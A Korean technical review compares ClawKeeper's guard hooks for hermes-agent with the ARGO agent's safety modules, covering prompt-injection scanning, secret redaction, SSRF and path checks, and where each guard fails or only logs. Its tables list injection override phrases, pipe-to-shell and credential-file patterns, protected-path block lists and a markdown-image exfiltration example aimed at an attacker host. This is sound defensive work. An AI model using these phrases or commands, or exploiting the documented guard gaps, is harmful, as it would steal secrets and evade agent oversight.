# ClawKeeper × ARGO Safety 기법 대조 분석

작성일 2026-09-02 · 코드 직접 확인 기반 · **서브에이전트 3인 코드 대조 리뷰 반영 (rev.2)**

---

## 0. 분석 방법

**원칙**: README·`docs/`·모듈 주석을 근거로 삼지 않고 구현 코드(함수 본문, 상수 테이블,
호출 지점)를 직접 읽어 판정했다. 주석을 인용한 경우 "주석 근거"임을 명시한다.

**조사 대상 커밋 (고정, 검증됨)**

| 저장소 | 경로 | 커밋 |
|---|---|---|
| ARGO | `~/Works/ARGO-ClawKeeper` (worktree, `dev/byungchul.so/clawkeeper`) | `2205b7c3ff` |
| ClawKeeper | `~/Works/ClawKeeper` (`SafeAI-Lab-X/ClawKeeper`) | `69db077` |
| hermes-agent | `~/Works/hermes-agent` (`NousResearch/hermes-agent`) | `180291162f` |

**검증 등급**

- `[실행경로확인]` — 호출 체인을 끝까지 추적
- `[코드확인]` — 구현은 읽었으나 호출 경로는 미추적
- `[실측]` — 실제로 실행해 확인
- `[미검증]` — 확인 못 함 (추측으로 채우지 않음)

**rev.2 리뷰에서 뒤집힌 판정** (상세는 각 절에)

1. §1.5 "승인 콜백이 thread-local이라 유실된다" → **철회**. hermes에
   `propagate_context_to_thread`가 있고, `computer_use`는 아예 모듈 전역이다.
2. §1.5에 **새 발견 추가** — `computer_use` 콜백은 시그니처 불일치로 모든 동작을 거부시킨다.
3. §4 `network_policy` "ON" → **부분 ON**. 기본 `ShellMode::System`에서 해당 경로를 안 탄다.
4. §3 `credential_redact` 갭 "`jwt` 하나" → **3종**.

> **주의**: 같은 이름의 저장소가 둘 있다. `rad-security/clawkeeper`(Bash, OpenClaw 호스트
> 스캐너)는 hermes-agent와 무관하다. 이 문서는 `SafeAI-Lab-X/ClawKeeper`(Python)만 다룬다.

---

## 1. ClawKeeper가 hermes-agent에 적용하는 safety 기법

### 1.1 부착 지점 — 코드로 확인한 3개 훅

`clawkeeper_core/adapters/hermes.py`의 `install(judge, agent)`가 연결하는 지점.
hermes-agent HEAD(`180291162f`)에 해당 심볼이 실재하는지 전부 대조했다. **[실행경로확인]**

| # | ClawKeeper가 부르는 것 | hermes 실재 위치 | 차단력 |
|---|---|---|---|
| ①-a | `terminal_tool.set_approval_callback(approval_cb)` | `tools/terminal_tool.py:301` | **차단 가능** (단 hermes가 먼저 위험으로 flag한 명령만 도달) |
| ①-b | `computer_use.tool.set_approval_callback(approval_cb)` | `tools/computer_use/tool.py:69` | **⚠ 오작동 — 전부 거부** (§1.5(2)) |
| ② | `manager._hooks.setdefault("pre_tool_call", []).append(...)` via `hermes_cli.plugins._ensure_plugins_discovered()` | `hermes_cli/plugins.py:7030`, 훅 이름 `:164` | **차단 가능 (모든 툴 호출)** |
| ③ | `agent.tool_start_callback` / `tool_complete_callback` | `run_agent.py:467` `class AIAgent`, 인자 `:521-522` | **관찰 전용** (`hermes.py:379-381`, 명시적으로 raise 안 함) |

②의 차단 경로는 끝까지 추적해 확인했다: `_ensure_plugins_discovered()` →
`get_plugin_manager()`가 `_delivery_manager()`가 dispatch하는 것과 동일 객체 →
`invoke_hook`이 kwargs를 시그니처 필터링하므로 ClawKeeper의 좁은 `ck_pre_tool_call`도
TypeError가 안 남 → `_resolve_block_from_details`가 block 메시지 반환 →
`model_tools.py:1451-1466`에서 `tool_error(...)`로 변환하고 **실행하지 않음**.
`pre_tool_call`은 `_HOOK_TIMEOUT_FAIL_CLOSED_HOOKS`에도 포함(`plugins.py:443`).

### 1.2 실제로 설치되는 가드는 8개 중 6개

`hermes.py:30-42`의 import와 `_default_pre_guards()` / `_default_post_guards()`를 확인한
결과, ClawKeeper의 가드 8종 중 **`input_validator`와 `budget`은 hermes 경로에 전혀
포함되지 않는다.** **[코드확인]**

```python
# clawkeeper_core/adapters/hermes.py:93-117
def _default_pre_guards():
    return [guard_execution, guard_before_tool_call, url_safety_guard, script_body_scan_guard]

def _default_post_guards():
    return [return_content_scan_guard, credential_redact_guard]
```

### 1.3 기법별 상세

#### (a) `exec_gate` — 위험 명령 정규식 차단

`guards/exec_gate.py:97`. `security_rules.DANGEROUS_COMMAND_PATTERNS`(**실측 49개**)를
추출된 명령 문자열에 `search()`.

추출 규칙(`exec_gate.py:80-94`)에 주의: 툴 이름이 `bash|shell|exec|command|terminal`에
매치하면 **`command`/`cmd`/`script`/`input`/`code`/`bash`/`shell` 필드만** 이어붙인다.
그것들이 비었거나 bash류가 아닐 때만 모든 문자열 값으로 폴백한다. 즉 hermes 승인 경로
(`toolName="bash"`)에서는 `description`이 스캔되지 않는다.

```python
# guards/exec_gate.py:112-121
for rule in rules:
    if rule["regex"].search(command):
        return {"block": True, "matched": rule["id"], "severity": rule.get("severity"), ...}
return {"block": False}
```

룰 로드 실패 시 기본 정책은 **fail-closed**(`_DEFAULT_FAILURE_POLICY`, `:18`).

> **⚠ 실측된 오탐.** 49개 중 인덱스 22가 `_r(r"ver(?:sion)?|systeminfo|whoami")`
> (`security_rules.py:156`)인데 단어 경계가 없어 **"ver"를 포함한 모든 문자열**에 걸린다.
> **[실측]**
>
> ```
> cat server.log    -> MATCH ver(?:sion)?|systeminfo|whoami
> git log --oneline -> clean
> ls -la            -> clean
> ```
>
> 경로 ①은 hermes 자체 정규식이 먼저 flag한 명령만 도달하므로 `cat server.log`는
> 여기에 안 온다. 그러나 **경로 ②(`pre_tool_call` 훅)는 모든 툴 호출에 대해 실행**되므로
> 결과적으로 하드 차단된다.

#### (b) `path_guard` — 보호 경로 차단

`guards/path_guard.py:19-27`. 기본 룰 7개:
`~/.ssh/**`, `~/.aws/**`, `~/.gnupg/**`(CRITICAL), `~/.env`, `/etc/passwd`(HIGH),
`/etc/shadow`, `/etc/sudoers`(CRITICAL). 파라미터에서 경로 후보를 추출해 정규화 후 glob 매칭.
**fail-closed**(`:186-188`). **[코드확인]**

#### (c) `url_safety` — SSRF + 호모글리프

`guards/url_safety.py`. **[코드확인]**

- **SSRF**: `_BLOCKED_V4_NETS`(10/8, 172.16/12, 192.168/16, 127/8, 169.254/16, 100.64/10,
  0/8, 224/4, 240/4, 255.255.255.255/32) + `_BLOCKED_V6_NETS`(::1, fc00::/7, fe80::/10, ::)
  + `_BLOCKED_HOSTNAMES`(`metadata.google.internal`, `metadata.goog`, `instance-data`).
  **URL에 적힌 리터럴 IP만 파싱한다 — DNS 해석은 하지 않는다**(`_check_blocked_ip`, `:134-144`).
- **호모글리프**: `_HOMOGLYPH_MAP`(`:67-78`) — **키릴 21자 + 그리스 18자 = 39자**를 ASCII로
  치환해 도플갱어를 만들고, 치환이 일어났으면 플래그.

#### (d) `script_body_scan` — 동적 경로 조립 탐지

`guards/script_body_scan.py:111`. 리터럴 경로 정규식이 놓치는
`Path.home()/'.aws'/'credentials'` 같은 런타임 조립을 잡는 **동시출현 휴리스틱**.

민감 디렉터리 마커 **19개 항목(중복 1개, 고유 18)** — `.aws/credentials`, `.ssh/id_`,
`.gnupg/`, `.kube/config`, `/etc/shadow`, `.netrc`, `.pypirc` 등 — 과
파일-오퍼레이션 마커 **25개**(`Path.home`, `open(`, `expanduser`, `RawConfigParser`,
`cat `, `base64 ` 등)가 **같은 `command` 문자열 안에서 500자 이내**(`_PROXIMITY = 500`)에
함께 나타나면 차단. **[코드확인]**

#### (e) `return_content_scan` — 툴 결과의 프롬프트 인젝션 스캔

탐지 함수 `scan_content`는 `:122`, 가드 진입점 `return_content_scan_guard`는 **`:181`**.
**자체 패턴을 쓴다** — `security_rules.PROMPT_INJECTION_PATTERNS`(60개)는 이 가드가 아니라
`scanner.py` 로그 스캐너 전용임을 grep으로 확인. **[실행경로확인]**

| 범주 | 내용 |
|---|---|
| `override` (4패턴) | `ignore/disregard/forget/override + prior/previous…instructions`, `from now on you are`, `reveal your system prompt`, `maintainer-note`/`sanctioned` |
| `embedded_directive` (3패턴) | `run/execute/also cat` + `~/.ssh\|~/.aws\|/etc/passwd\|.env`, `curl\|wget … \| bash`, `base64 -d … \| sh` |
| `comment_directive` (1패턴) | `<!--` / `/*` / `# maintainer-note` 안에 `also run/dump/cat` 등 |
| `invisible_chars` (15 코드포인트) | ZWSP `U+200B`, ZWNJ, ZWJ, word joiner, BOM, bidi override `U+202A-202E`, isolate `U+2066-2069`, soft hyphen |
| `base64_decoded_to_shell` | 24자 이상 base64를 **실제로 디코드**해 `cat `, `/etc/`, `/.ssh/`, `AKIA`, `id_rsa` 등이 나오면 플래그 |

심각도 버킷(`:206-212`): `override` / `comment_directive` / `base64_decoded_to_shell` /
**`embedded_directive` 3패턴 전부**(민감 경로 조건 없음) → `block: True, severity: critical`.
그 외(비가시 문자 단독) → `block: False, severity: medium`.

#### (f) `credential_redact` — 패턴 기반 시크릿 마스킹

`guards/credential_redact.py`. 9개 패턴(`github_pat`, `openai_key`(`sk-`/`sk-ant-`),
`aws_access_key_id`, `stripe_key`, `bearer_header`, `jwt`, `ssh_private_key`(6종 헤더),
`generic_secret_kv`, `aws_secret_key`). `[REDACTED]`로 치환.
**의도적으로 차단하지 않는다**(`block: False`, `:147`). **[코드확인]**

#### (g) `Judge` — 트래젝토리/정책 게이트

`clawkeeper_core/judge.py:125` `judge_forwarded_context()`. 콘텐츠 스캐너가 아니라
**대화 흐름 판정기**. 판정 분기 6개(코드 순서대로): **[코드확인]**

0. `forwardedContext.messages` 없음 → `stop` (`missing_input`, `:139-150`)
1. 사용자가 중단 요청 → `stop`
2. 상류 툴 에러 존재 → `stop`
3. 사용자 턴 없이 툴 호출 수 > `maxToolStepsWithoutUserTurn` → `ask_user`
4. 명령 실행 툴 감지 + 확인 필요 정책 → `ask_user`
5. 위험도 임계 초과 → `stop`

기본 정책(`judge.py:21-27`):

```python
DEFAULT_POLICY = {
    "maxRiskBeforeStop": "critical",
    "requireUserConfirmationFor": ["exec", "bash", "shell", "network", "write"],
    "autoContinueAllowed": False,
    "maxToolStepsWithoutUserTurn": 3,
    "treatCommandExecutionAsHighRisk": True,
}
```

> **⚠ 기본값이 만드는 결과. [실행경로확인]** 어댑터는 승인 콜백에서
> `{"role":"tool","toolName":"bash"}`를 컨텍스트에 덧붙여 Judge에 넘긴다(`hermes.py:168-179`).
> `_normalize_message`가 `toolName`을 보존하고, 덧붙인 메시지가 마지막이라 `active_messages`
> 슬라이스에 항상 포함된다. 따라서 `has_command_tool = True`, `autoContinueAllowed = False`
> → 판정은 항상 `ask_user`. 그런데 어댑터 매핑표는 `"ask_user" → "deny"`다
> (`hermes.py:50-54`, 승인 콜백 안에서는 사용자에게 물을 수 없기 때문).
> **⇒ 기본 정책에서 승인 콜백에 도달한 명령은 전부 거부된다.**
> 턴 내 툴 호출이 4회를 넘겨도 같은 경로로 거부된다.

### 1.4 체인 실행 규칙

`adapters/base.py:70` `run_guard_chain`. **[코드확인]**

```python
for guard in guards:
    try:
        d = guard(event)
    except Exception as exc:
        d = {"block": False, ...}      # ← 가드가 터지면 fail-OPEN
    if d is None: continue
    seen.append(d)
    if d.get("block") and blocking is None:
        blocking = d
        if stop_on_block: break
```

- 가드 예외 → **fail-open**(통과, `:80-90`). 단 `exec_gate`/`path_guard`는 *룰 로드 실패*에
  한해 스스로 fail-closed를 반환한다 — 두 실패 모드가 다르다.
- pre 체인은 `stop_on_block=True`, post 체인은 `False`.

### 1.5 ⚠ 이 통합의 실제 차단력 — 코드로 확인한 두 가지 문제

**(1) post 가드는 hermes에서 아무것도 막지 못한다. [실행경로확인]**

`hermes.py`의 `on_tool_complete`는 `make_event(...)`로 **로컬 dict**를 만들어 체인에 넘긴다.
`credential_redact_guard`는 그 dict의 `event["content"]`를 치환하지만, hermes가 LLM에
전달하는 실제 `result` 객체와는 무관하다. `return_content_scan_guard`가 `block: True`를
반환해도 `_blocking`은 `hermes.py:401`에서 폐기되고 `_record_decision()`으로 기록만 된다.

⇒ **ClawKeeper에서 가치가 가장 큰 두 가드(툴 결과 PI 스캔, 시크릿 마스킹)가
hermes 경로에서는 로깅 전용이다.**

**(2) `computer_use` 승인 콜백은 시그니처가 안 맞아 모든 동작을 거부시킨다. [실행경로확인]**

> rev.1에서 "승인 콜백이 thread-local이라 워커 스레드에서 유실된다"고 썼으나 **철회한다.**
> `terminal_tool.py:268`이 `threading.local()`인 것은 맞지만,
> hermes에 `tools/thread_context.py:64 propagate_context_to_thread`가 있어 부모 스레드의
> 승인 콜백을 워커에 복사한다(fail-closed 명시). `run_agent.py:2066`,
> `model_tools.py:191`, `tools/async_delegation.py:51` 등에서 사용된다.
> 게다가 `computer_use`는 thread-local이 아니라 **모듈 전역**(`tool.py:66`)이다.

대신 실제 문제는 **콜백 규약 불일치**다.

```python
# hermes-agent/tools/computer_use/tool.py:619
verdict = cb(action, args, summary)          # 위치 인자 3개
# :620-622  except Exception: verdict = "deny"
# :638      return json.dumps({"error": "denied by user", ...})   # 미인식 verdict 폴백

# ClawKeeper/clawkeeper_core/adapters/hermes.py:151
def approval_cb(command: str, description: str = "") -> str:   # 위치 인자 최대 2개
```

두 겹으로 어긋난다:

1. **인자 개수** — 3개로 호출되므로 `TypeError` → `:620`의 `except`에 잡혀 `verdict = "deny"`
2. **반환 어휘** — 설령 인자가 맞아도 ClawKeeper는 `"once"`를 반환하는데 hermes는
   `"approve_once"`를 기대한다. 미인식 값은 `:638`에서 `denied by user`로 폴백

⇒ **ClawKeeper를 설치하면 `computer_use`(GUI 자동화) 동작이 전부 거부된다.**
안전 측면에서는 fail-closed이지만 의도된 동작이 아니며, 실사용에서는 기능 정지로 나타난다.

---

## 2. ARGO safety 기능 인벤토리 (코드 기준)

ClawKeeper 대응 여부와 무관하게 `tinicore`/`tinicore-traits`에서 발견한 safety 모듈.
`§2.8`에 나머지 관련 모듈을 별도로 모았다.

### 2.1 값 탐지 → 마스킹 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| PII 엔진 | `guardrails/{recognizer,detector,filter}.rs` + `guardrails/handwritten/` (≈4.3k) | `regex-automata` lazy DFA + `aho-corasick`. **인식기 49종**(실측) — 카드번호·주민번호·여권·계좌·전화 + GitHub ×7, AWS ×2, Stripe ×2, Slack ×5, GCP/Google ×5, Square ×2, Facebook ×2, Twilio, PayPal, Braintree, Mailgun, Mailchimp, `certificate`, `password`/`password_strict`, `api_key` |
| `SensitiveDetector` 트레잇 | `tinicore-traits/src/sensitive.rs` | 탐지기 계약. 워크스페이스 전체 `impl` **30개 중 실제 탐지 구현은 `PiiSpanDetector` 하나**(`guardrails/detector.rs:475`). 나머지 29개는 테스트 더블이며, 그중 `extractor/mock.rs:165`는 `cfg(test)` 게이트 없이(`extractor/mod.rs:33` `pub mod mock;`) 프로덕션 빌드에도 포함된다 |
| `DetectorChain` | `sensitive/chain.rs` (792) | 탐지기 N개 합성. 마스킹은 `detect_all`(전원 통과), **차단은 `detect_any_of`**(kind 지정, 해당 kind 첫 히트에서 중단 — `sensitive/guardrail.rs:143`). `detect_any`(`chain.rs:210`)도 존재하나 차단 경로는 쓰지 않는다 (`chain.rs:214-231`이 그 이유를 설명) |
| redaction vault | `sensitive/redaction.rs` (1846) | 마스킹↔복원 라운드트립 보장 |
| `SensitiveGuardrail` | `sensitive/guardrail.rs` (635) | 탐지 결과를 차단 판정으로 |
| `EgressMask` | `agent/pii_masking.rs` (3852) | LLM 송신 직전 마스킹 적용 지점 |

> `api_key` 인식기의 `Bearer [\w\.\=\-]{10,}` 정규식은 YAML의
> `# Original regex patterns (for reference)` **주석**이다(`pii_filter_config.yaml:747`).
> 실제 구현은 `HandWrittenRecognizer` → AhoCorasick.

### 2.2 콘텐츠 스캔 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| `audit_text()` | `dispatchable_policy/audit.rs:1016` (2313) | **룰 23개**(실측) / 6범주: `PromptInjection` 4, `DataExfiltration` 4, `CredentialAccess` 8(openai·anthropic·github·aws·ssh·google·slack), `InvisiblePayload` 2(**태그 코드포인트 `U+E0001-E007F` + BiDi override `U+202A-202E`,`U+2066-2069`**), `Obfuscation` 3(base64/hex→shell, ANSI), `Privilege` 2. `Severity` 5단계. `block_threshold`/waiver는 주석 근거 |
| `PromptGuard` | `agent/prompt_guard.rs` (694) + traits (149) | **인바운드 사용자 메시지**에 대한 PI 탐지. 호스트 공급 정규식 룰, `Warn`/`Sanitize`/`Block` 액션 |
| `static_scan` | `security/static_scan.rs` (278) | 스킬 번들 소스의 위험 패턴 시그니처 스캔 (설치 시점) |
| `DeniedPatternGuardrail` | `agent/guardrails_builtin.rs` (667) | `RegexSet` 기반. **4개 가드레일 트레잇을 모두 구현**(`:124/134/144/198`) — 같은 룰셋을 input/output/tool_input/tool_output 어디에나 등록 가능 |
| 분류기 어댑터 | `agent/guardrails_classifier.rs` (1086) | LLM 기반 `AutoModeClassifier`를 TOOL-INPUT 가드레일로. `Accept`→pass / `AskUser*`→Escalate / `Block`→Block |

### 2.3 툴 호출 게이트 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| G1 arg-shape | `agent/guardrails_tool_input/mod.rs` (2554) | 카탈로그 밖 툴명·필수 인자 누락 |
| G2 `command_safety` | 같은 폴더 (1859) | **argv 파싱 화이트리스트**. `UNCONDITIONALLY_SAFE:56`, `FIND_UNSAFE:64`, `GIT_UNSAFE_GLOBAL:88`, `REJECTED_SHELL_CHARS:145`, sudo/env 래퍼 분해. Safe/Dangerous/**Unknown** 3상태 |
| G3 위험 인자 | 같은 폴더 | `DROP`/`DELETE` without `WHERE`, `../` 이스케이프, 비허용 호스트 등. **`secret_path.rs`(573)는 그중 한 하위 검사** — `.aws/credentials`, `.kube/config`, `.docker/config.json`, `.gnupg`, `.ssh`(단 `known_hosts`, `known_hosts.old`, `config`, `authorized_keys` 예외) |
| G4 `path_boundary` | 같은 폴더 (407) | 쓰기 대상의 허용 루트 이탈 |
| `path_validator` | `security/path_validator.rs` (1063) | 심볼릭 링크 해석 + 블록리스트. `/.ssh/` **전체**, `/.aws/credentials`, `/.aws/config`, `/.kube/config`, `/etc/shadow` 등을 부분문자열로 차단 (예외 없음) |
| `confine` | `security/confine.rs` (667) | 앵커 밖으로 벗어나는 경로 거부 |
| `CapabilityBroker` | `tools/capability_map.rs` | 아웃바운드 액션 권한 검사 **[코드확인]** |
| 승인 원장 | `agent/approval_ledger.rs`(684 포함 그룹) , `approval_store.rs` | principal×tool 영속 승인 기록 |

### 2.4 네트워크 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| `ssrf` | `security/ssrf.rs` (691) | `reject_ssrf_target`(`:48`, 리터럴) + `reject_ssrf_resolved`(`:188`, **`tokio::net::lookup_host`로 DNS 해석 후 재검사**). loopback/RFC1918/link-local/CGNAT/multicast/benchmark + **IPv4-mapped 및 compat IPv6 재분류**(`:134`) |
| `url_validator` | `security/url_validator.rs` (328) | `validate_outbound_url`(`:65`). 모듈 주석: "LLM이 준 URL을 다루는 모든 빌트인은 이걸 통과해야 함" |
| `network_policy` | `security/network_policy.rs` (1089) | 도메인 allowlist(`validate_domain`) + 사설망 판정(`is_private_or_local`). 두 기능의 활성화 상태가 다르다 — §4 참조 |
| `url_redact` | `security/url_redact.rs` (214) | 쿼리 파라미터 시크릿 제거(텔레메트리용) |
| exfil 팩 | `agent/guardrails_exfil/` (2557) | `url_scan.rs` — `UrlContext::AutoFetched` 기반 **제로클릭 마크다운 이미지 유출** 탐지 / `secret_needles.rs` — env 시크릿 **값** 유출 경보 |

### 2.5 시크릿 관리 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| `tools/scrubber` | `tools/scrubber.rs` (956) | 툴 출력 3패스(`:42` → `:213` → `:417`): **env 시크릿 값 치환** → base64 블롭 축약 → 크기 상한. `collect_env_secrets`(`:470-474`)는 `len >= 8 && (KEY\|SECRET\|TOKEN\|PASSWORD)` |
| `output_scrubber` | `security/output_scrubber.rs` (279) | 심층 방어용 시크릿 값 스크럽 |
| `credential_proxy` | `security/credential_proxy.rs` (1000) | 실행 직전 마지막 단계에서 시크릿 주입 **[코드확인]** |
| `secret_scope`(495) / `secret_tracker`(178) / `secret_ref`(530) / `secret_vault/`(549) | `security/` (합 1752) | 툴별 시크릿 접근 범위, 접근 횟수 이상 탐지, 참조 기반 전달, 파일 백업 볼트 |

### 2.6 실행 격리 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| `SkillSandbox` | `security/sandbox.rs` (1512) | 스킬 실행 통합 진입점 |
| `ExecSandbox` | `tinicore-traits/src/exec_sandbox.rs` | OS 격리 계약 |
| `integrity` | `security/integrity.rs` | 인증 스킬 SHA-256 변조 탐지 |
| Untrusted 봉투 | `tools/tool_orchestrator/execution.rs` `post_execute`(`:3539`), 판정 `:3568` | 미등록/외부 툴 결과를 "신뢰 불가"로 태깅 → 프롬프트 격리 봉투. **fail-closed** — `tool_def.is_none_or(|d| d.trust_tier == TrustTier::Untrusted)` |

### 2.7 배선 지점

| 지점 | 위치 | 비고 |
|---|---|---|
| TOOL-INPUT 체인 | `tools/tool_orchestrator/execution.rs:2800` | `run_tool_input_guardrails_where` |
| TOOL-OUTPUT 체인 | `tools/tool_orchestrator/execution.rs:3221` | `run_tool_output_guardrails`. `:3209` 주석이 이 지점을 `indirect-prompt-injection boundary`로 명시 |
| 시크릿 스크럽 | `tools/tool_orchestrator/execution.rs:3866` | `scrubber::finalize_result_safety` — **조건·feature 게이트 없이 호출** |
| 인바운드 PromptGuard | `agent/loop_.rs:1895` (정의는 `:674`) | 첫 LLM 왕복 전 |
| 매니페스트 감사 | `tools/registry/store.rs:418`, `dispatchable_policy/discovery.rs:731` | `audit_text` 프로덕션 호출부 — **이 둘뿐**(그 외 `tools/registry/tests.rs:3111` 테스트) |

### 2.8 위 표에 넣지 않은 관련 모듈

인벤토리 완결성을 위해 별도로 나열한다. **[코드확인]**

| 모듈 | LOC | 역할 |
|---|---|---|
| `agent/guardrails.rs` | 2077 | **가드레일 셋 등록·조회 러너** — `GuardrailSet`, `install_guardrails`, `global_guardrails`, `install_guardrails_from_env`, `with_tool_input_pack`, `with_exfil_pack` |
| `session/db/security_flags.rs` | 1223 | 세션 DB의 보안 플래그 |
| `agent/guardrail_scan_cache.rs` | 684 | INPUT 가드레일 히스토리 스캔의 턴 간 메모 |
| `guardrails/hook.rs` | 430 | 레거시 `PiiHookCallback` (프로덕션 미설치) |
| `tinicore-traits/src/audit.rs` | 151 | `AuditSink` 트레잇 |
| `security/audit_sink.rs` | 147 | `AuditSink` 구현 2종 |
| `guardrails/validator.rs` | 61 | Luhn·주민번호·전화번호 체크섬 |
| `types/security.rs` | 39 | 보안 타입 |
| `context_policy/`, `harness/guard.rs`, `agent/policy.rs`, `protocols/governance/` | — | 컨텍스트 정책, 세션 경계 신호, 거버넌스 승인 |

---

## 3. 1:1 매칭표

등급: **완전대응** / **부분대응** / **ClawKeeper에만 있음** / **ARGO에만 있음**

### 3.1 ClawKeeper 기준

| ClawKeeper 기법 | ARGO 대응물 | 등급 | 차이 (코드 근거) |
|---|---|---|---|
| `exec_gate` (블랙리스트 정규식 49) | `guardrails_tool_input/command_safety.rs` | **부분대응** | 패러다임이 반대. ARGO는 argv를 파싱하는 **화이트리스트**로 Safe/Dangerous/Unknown 3상태. 단 **`Unknown`의 처분은 `EscalateAction`에 달려 있어 `Allow` 설정에서는 통과한다**(`command_safety.rs:72,663`). ClawKeeper는 블랙리스트 2상태 + `ver` 오탐 실측 |
| `path_guard` (glob 7) | `security/path_validator.rs`(기본 ON) + G3 `secret_path`·G4 `path_boundary`(기본 OFF) + `confine` | **완전대응** | 단 **계층이 갈린다**: 기본 ON인 `path_validator`는 `/.ssh/`를 예외 없이 통째로 차단하는 *더 거친* 층이고, `known_hosts` 예외를 가진 *더 세밀한* G3는 기본 OFF다 |
| `url_safety` — SSRF 절반 | `security/ssrf.rs` + `security/url_validator.rs` | **완전대응** | ARGO가 더 강함: **DNS 해석 후 재검사**(ClawKeeper는 리터럴 IP만), IPv4-mapped/compat IPv6 재분류, benchmark 대역 포함. 적용 범위도 넓다 — `ssrf.rs` 직접 호출은 `web_render`·브라우저 어댑터·`tiniffi/http` 한정이나, 동일 판정이 `validate_outbound_url`을 통해 `http_fetch`·`http_post`·`brave_search`·`desktop_web`·`document_read`에 적용된다 |
| `url_safety` — 호모글리프 절반 | 없음 | **ClawKeeper에만 있음** | 워크스페이스 전체에서 도메인/URL 대상 호모글리프·confusable·IDN·혼용 스크립트 판정이 없음을 확인. `skills/mod.rs:676`은 스킬 **이름**에 대한 `is_unicode_bidi_or_format_control`로 대상이 다름 |
| `script_body_scan` (동적 경로 조립) | 사실상 없음 | **ClawKeeper에만 있음** | 가장 가까운 것은 `security/static_scan.rs`이나 적용 시점(스킬 번들 설치)·대상(소스 파일)이 다르다. 런타임 툴 인자의 동적 경로 조립 근접도 판정은 없음 |
| `return_content_scan` (툴 결과 PI) | `dispatchable_policy::audit_text()` — 룰은 대응, **적용 지점이 없음** | **부분대응** | 탐지 범주가 거의 겹침(override↔PromptInjection, invisible↔InvisiblePayload, base64→shell↔Obfuscation, embedded_directive↔DataExfiltration). 단 ARGO는 **매니페스트 등록 시점에만** 호출 — 런타임 툴 결과엔 미적용. ClawKeeper는 hermes에서 로깅 전용(§1.5) — **양쪽 다 실효 차단이 없다** |
| `credential_redact` (패턴 9) | PII 엔진 49종 + `audit.rs` CredentialAccess 8 + `tools/scrubber.rs` + `secret_needles.rs` | **부분대응** | 커버리지는 대체로 ARGO가 넓으나 **3개 갭이 있다**: ① `jwt`(`eyJ…`) — YAML·audit.rs 어디에도 없음 ② `aws_secret_key`(40자 시크릿) — ARGO는 access key **ID**만(`audit.rs:378`, YAML 2종) ③ `generic_secret_kv` — ARGO의 `password`/`password_strict`는 pass/PWD 계열만 앵커해 `token=`·`secret=`·`client_secret=` 미커버 |
| `input_validator` | `guardrails_tool_input/mod.rs` G1 | **완전대응** | 단 ClawKeeper는 **hermes 경로에 설치조차 안 됨**(§1.2) |
| `budget` (토큰 예산) | 없음 | **ClawKeeper에만 있음** | 단 hermes 경로에 설치 안 됨. ARGO Core는 `Path::home()`/env 직접 읽기가 레이어 규칙 위반이라 그대로 이식 불가 |
| `Judge` (트래젝토리 게이트) | `agent/guardrails_classifier.rs` + 승인 흐름 | **부분대응** | ClawKeeper Judge는 **규칙 기반**(툴 호출 수 임계, 명령툴 감지). ARGO는 LLM 분류기 + `Escalate`로 승인 흐름 라우팅. **"턴 내 툴 호출 N회 초과 시 확인" 같은 루프 임계 규칙은 ARGO에 대응물 없음** |
| Watcher (외부 LLM 감시, 선택) | `guardrails_classifier.rs` | **부분대응** | 둘 다 LLM 판정. ARGO는 툴별 `ToolSignal`이 있어야만 분류(신호 없으면 분류 안 함), ClawKeeper는 별도 데몬 |

### 3.2 ARGO에만 있음

| ARGO 기능 | 위치 | ClawKeeper 대응 없음 |
|---|---|---|
| 가역 마스킹 vault | `sensitive/redaction.rs` | 마스킹→LLM→복원 라운드트립. ClawKeeper는 `[REDACTED]` 단방향 |
| 한국/미국 PII 인식기 | `guardrails/config/pii_filter_config.yaml` + `validator.rs` | 주민등록번호·운전면허·여권·계좌·전화 + Luhn/체크섬 검증. ClawKeeper는 PII 패턴이 전무(시크릿만) |
| Untrusted 프롬프트 격리 봉투 | `execution.rs:3539,3568` | 차단 대신 **태깅** — 신뢰 불가 출처를 LLM에 명시. fail-closed |
| `CapabilityBroker` | `tools/capability_map.rs` | 아웃바운드 액션 권한 게이트 |
| 시크릿 참조/스코프/추적/볼트 | `security/secret_{ref,scope,tracker,vault}` | 툴별 접근 범위 + 접근 횟수 이상 탐지 + 마지막 단계 주입 |
| 실행 샌드박스 | `security/sandbox.rs`, `confine.rs`, `exec_sandbox.rs` | OS 수준 격리 |
| 스킬 무결성 | `security/integrity.rs` | SHA-256 변조 탐지 |
| 제로클릭 유출 채널 탐지 | `guardrails_exfil/url_scan.rs` | `![](https://attacker/leak?d=…)` 마크다운 이미지 |
| 인바운드 PromptGuard | `agent/prompt_guard.rs` | 사용자 메시지 자체에 대한 PI 게이트 |
| 도메인 allowlist | `security/network_policy.rs` | 이그레스 허용 목록 |
| 가드레일 스캔 캐시 | `agent/guardrail_scan_cache.rs` | 턴 간 메모이제이션 |

---

## 4. ARGO 대응 기능의 활성화 상태

**(a) 코드 존재 / (b) 기본 빌드 컴파일 / (c) 런타임 실제 실행** 3단계로 분리 판정.
기준은 **env 변수 없음 + 설정 파일 없음 + 기본 cargo feature**.

| 기능 | (a) | (b) | (c) 런타임 기본 동작 | 최종 |
|---|---|---|---|---|
| `tools/scrubber` 시크릿 스크럽 | ✅ | ✅ (`tools/mod.rs:70` 게이트 없음) | ✅ `execution.rs:3866` — `post_execute` 안에서 감싸는 `if`/`#[cfg]` 없이 호출 | **ON** |
| Untrusted 격리 봉투 | ✅ | ✅ | ✅ `post_execute`에서 항상, `tool_def` 없으면 Untrusted (fail-closed) | **ON** |
| `security/ssrf` + `url_validator` | ✅ | ✅ | ✅ `web_render.rs:192,217`, `tinicli/adapters/web_render_ssrf.rs`, `tiniffi/http.rs:179` 무조건. `validate_outbound_url`은 `http_fetch`·`http_post`·`brave_search`·`desktop_web`·`document_read`에서 호출 | **ON** |
| `path_validator` | ✅ | ✅ | ✅ 파일 빌트인이 진입 시 `validate_file_path` + `reauthorize_canonical_in_scope` 통과 | **ON** |
| `network_policy` — 사설IP 판정 | ✅ | ✅ | ✅ `url_validator.rs:87` `is_private_or_local` | **ON** |
